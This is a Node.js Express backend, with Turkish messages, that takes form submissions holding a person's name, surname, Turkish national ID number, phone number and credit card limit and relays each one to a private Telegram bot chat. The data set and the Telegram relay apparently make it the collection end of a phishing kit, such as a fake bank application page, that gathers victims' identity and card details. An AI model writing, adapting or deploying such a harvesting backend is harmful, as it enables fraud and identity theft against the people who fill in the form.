const express = require('express');
const axios = require('axios');
const cors = require('cors');
const dotenv = require('dotenv');

dotenv.config();

const app = express();
const port = process.env.PORT || 3001;

app.use(express.json());
app.use(cors({
  origin: process.env.ALLOWED_ORIGIN || 'http://localhost:3000', // Varsayılan olarak yerel geliştirme için
  methods: ['POST'],
  allowedHeaders: ['Content-Type'],
}));

const botToken = process.env.BOT_TOKEN;
const chatId = process.env.CHAT_ID;

if (!botToken || !chatId) {
  console.error('Hata: BOT_TOKEN veya CHAT_ID eksik. Lütfen environment variables\'ı kontrol edin.');
  process.exit(1);
}

app.post('/submit', async (req, res) => {
  const { isim, soyisim, tc, tel, kredi_karti_limiti } = req.body;

  if (!isim || !soyisim || !tc || !tel || !kredi_karti_limiti) {
    console.error('[Backend] Eksik veri:', { isim, soyisim, tc, tel, kredi_karti_limiti });
    return res.status(400).json({ error: 'Tüm alanlar (isim, soyisim, T.C., telefon, kredi kartı limiti) zorunludur.' });
  }

  const message = `
Yeni Başvuru:
İsim: ${isim}
Soyisim: ${soyisim}
T.C. Kimlik No: ${tc}
Telefon: ${tel}
Kredi Kartı Limiti: ${kredi_karti_limiti}
  `;

  console.log('[Backend] Telegram’a gönderilecek mesaj:', message);

  const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

  try {
    const response = await axios.post(telegramUrl, {
      chat_id: chatId,
      text: message,
      parse_mode: 'HTML',
    });

    console.log('[Backend] Telegram mesajı gönderildi:', response.data);
    res.status(200).json({ message: 'Bilgiler Telegram botuna gönderildi.' });
  } catch (error) {
    console.error('[Backend] Telegram mesajı gönderilemedi:', error.response ? error.response.data : error.message);
    res.status(500).json({ error: 'Telegram mesajı gönderilemedi.' });
  }
});

// Yerel test için
if (process.env.NODE_ENV !== 'production') {
  app.listen(port, () => {
    console.log(`API server http://localhost:${port} adresinde çalışıyor.`);
  });
}

module.exports = app;
